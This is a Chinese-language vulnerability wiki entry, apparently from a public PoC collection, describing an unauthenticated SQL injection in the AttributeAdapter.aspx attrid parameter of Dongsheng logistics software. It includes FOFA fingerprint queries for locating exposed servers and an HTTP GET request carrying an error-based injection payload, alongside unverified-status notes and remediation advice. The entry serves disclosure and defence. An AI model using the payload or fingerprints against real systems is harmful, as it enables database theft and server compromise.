---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "东胜物流软件 AttributeAdapter attrid SQL注入"
product: "东胜物流软件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；SQL Server @@version类型转换"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6%20AttributeAdapter.aspx%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"FeeCodes/CompanysAdapter.aspx\" || body=\"dhtmlxcombo_whp.js\" || body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\""
fofa_unverified: "body="
id: "vw-92ff098683b7b4e8068264c9"
entity_id: "ve-92ff098683b7b4e8068264c9"
schema_version: "1"
---

# 东胜物流软件 AttributeAdapter attrid SQL注入

## 条目说明

- 对象与具体问题：东胜物流软件；AttributeAdapter attrid SQL注入
- 版本、配置及部署条件：版本未知；SQL Server @@version类型转换
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有报错型请求，无实际版本回显/源码，未证明SQLi成功
- 在野已知/广泛高危模板无来源；高权限写木马需单列条件
- 四项指纹OR较完整但元数据仅body=，不可直接索引
- HTTP无围栏，补固定版本和修复公告

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

东胜物流软件 AttributeAdapter.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 影响版本

东胜物流软件 

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

POC/EXP：

```http
GET /FeeCodes/AttributeAdapter.aspx?handle=attrinfo&attrid=1%27%20and%201=@@version%20-- HTTP/1.1
Host: 127.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
```


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
